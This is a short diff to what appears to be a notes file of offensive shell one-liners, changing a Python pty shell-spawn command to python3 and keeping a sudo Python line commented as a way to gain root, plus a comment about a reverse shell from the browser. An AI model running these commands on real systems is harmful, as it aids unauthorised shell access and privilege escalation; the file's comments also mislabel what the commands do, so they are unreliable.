@@ -1,4 +1,4 @@
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 #used to gain root access in some systems.
 sudo python3.5 -c ‘import os; os.system(“/bin/sh”)’
 #command used to open up a reverse shell from the browser.
